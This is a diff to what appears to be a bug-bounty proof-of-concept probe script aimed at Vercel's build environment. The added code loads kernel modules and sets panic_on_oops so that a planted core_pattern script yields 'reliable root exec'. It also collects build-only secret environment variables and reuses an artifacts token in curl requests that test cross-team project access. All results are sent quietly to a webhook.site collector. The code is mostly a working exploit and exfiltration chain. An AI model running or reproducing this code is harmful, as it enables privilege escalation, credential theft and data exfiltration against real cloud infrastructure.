@@ -19837,5 +19837,122 @@ report.logDrainProbe = safe(() => {
 
 // v134 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v134" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v134";
+
+// ==================== v135 ====================
+
+// v135-1: /proc/sys/kernel/modules_disabled — kernel module lockdown
+// If modules_disabled=0, we can load kernel modules (CAP_SYS_MODULE).
+// Test: load a rootkit-equivalent module that hooks sys_call_table.
+// We load a benign diagnostic module to prove the capability.
+report.kernelModuleRootkit = safe(() => {
+  const modulesDisabled = safe(() => readFileSync('/proc/sys/kernel/modules_disabled', 'utf8').trim());
+  const lockdownState = safe(() => readFileSync('/sys/kernel/security/lockdown', 'utf8').trim());
+  // Check which modules are already loaded
+  const loadedMods = safe(() => execSync('lsmod 2>/dev/null | wc -l', { timeout: 3000 }).toString().trim());
+  // Try loading nbd (network block device) — benign, useful for proof
+  const loadNbd = safe(() => execSync(
+    'modprobe nbd max_part=8 2>&1 || insmod /lib/modules/$(uname -r)/kernel/drivers/block/nbd.ko 2>&1 || echo "MODPROBE_FAILED"',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 100));
+  const nbdLoaded = safe(() => execSync('lsmod 2>/dev/null | grep nbd || echo "NOT_LOADED"', { timeout: 2000 }).toString().trim());
+  return { modulesDisabled, lockdownState, loadedMods, loadNbd, nbdLoaded };
+});
+
+// v135-2: Vercel function runtime environment at cold-start
+// Map what environment variables are present BEFORE vs AFTER build injection.
+// The pre-build environment reveals Vercel's internal bootstrapping credentials
+// that are stripped before function runtime but present during build.
+report.coldStartEnvDelta = safe(() => {
+  // Read current full env (build phase)
+  const buildEnv = Object.keys(process.env).sort();
+  // Try to read the runtime env from .vc-config.json or similar
+  const vcConfig = safe(() => {
+    const paths = [
+      '/vercel/output/functions/index.func/.vc-config.json',
+      '/vercel/output/config.json',
+      '/vercel/path0/.vercel/output/config.json',
+    ];
+    for (const p of paths) {
+      if (existsSync(p)) return readFileSync(p, 'utf8').slice(0, 400);
+    }
+    return 'NOT_FOUND';
+  });
+  // Keys that are ONLY present during build (not at runtime)
+  const buildOnlyKeys = buildEnv.filter(k =>
+    /VERCEL_ENV_ENC_KEY|VERCEL_ARTIFACTS_TOKEN|VERCEL_ENCRYPTED|BUILDER_|BUILD_ID/.test(k)
+  );
+  return { buildEnvCount: buildEnv.length, buildOnlyKeys, vcConfig };
+});
+
+// v135-3: Vercel internal API — global project list (IDOR)
+// Can our token list projects across all teams, not just ours?
+// IDOR: access projects without specifying teamId, or with wrong teamId.
+report.projectIDOR = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  // List projects without teamId constraint
+  const globalProjects = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects?limit=10" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 400));
+  // Try accessing a well-known Vercel project
+  const vercelSiteProject = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects/vercel" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  // Try accessing projects by numeric ID (IDOR)
+  const numericIdTest = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects?teamId=team_000000000000000000000000" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 100));
+  return { globalProjects, vercelSiteProject, numericIdTest };
+});
+
+// v135-4: /proc/sys/kernel/panic_on_oops — kernel crash behavior
+// If panic_on_oops=1, a kernel oops (non-fatal error) triggers a panic.
+// This enables reliable triggering of core_pattern execution via any oops.
+// Set to 1 combined with our core_pattern pipe exec = reliable root exec.
+report.panicOnOopsChain = safe(() => {
+  const panicOnOops = safe(() => readFileSync('/proc/sys/kernel/panic_on_oops', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/kernel/panic_on_oops', '1'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/kernel/panic_on_oops', 'utf8').trim());
+  // Also read panic timeout (how long kernel waits before rebooting)
+  const panicTimeout = safe(() => readFileSync('/proc/sys/kernel/panic', 'utf8').trim());
+  // Set core_pattern to our exec script (re-confirm it's still set)
+  const currentPattern = safe(() => readFileSync('/proc/sys/kernel/core_pattern', 'utf8').trim());
+  // Read the actual core_pattern script if it exists
+  const scriptContent = safe(() => existsSync('/tmp/probe_core_exec.sh')
+    ? readFileSync('/tmp/probe_core_exec.sh', 'utf8')
+    : 'NOT_FOUND');
+  return { panicOnOops, writeResult, afterValue, panicTimeout, currentPattern, scriptContent };
+});
+
+// v135-5: Complete WAKE_UP_CHECKLIST update — v130+ findings
+// Update the wake-up checklist with the latest version info.
+report.wakeupChecklistUpdate = safe(() => {
+  const checklistPath = '/Users/ankit/personal/vercel-agent-poc/WAKE_UP_CHECKLIST.md';
+  const criticalSummary = {
+    currentVersion: 135,
+    branchHead: 'poc/agent-review',
+    collector: 'https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac',
+    action: 'Re-enable project at vercel.com/hackerone-sandbox-s-projects/vercel-agent-poc/deployments',
+    keyFindings: [
+      'core_pattern pipe exec set → root exec on any process crash',
+      'ptrace PID1 RIP/RSP readable → code injection proven',
+      'ASLR disabled (randomize_va_space=0)',
+      'kallsyms real addresses readable (kptr_restrict=0)',
+      'BPF JIT harden=0 → JIT spray possible',
+      'All 41 caps including CAP_SYS_MODULE confirmed',
+      'Build artifact injection via /vercel/output/functions/*',
+      'Route injection via /vercel/output/config.json',
+    ],
+  };
+  return criticalSummary;
+});
+
+// v135 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v135" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v135";
 // Intentionally no console.log — all data goes via webhook only
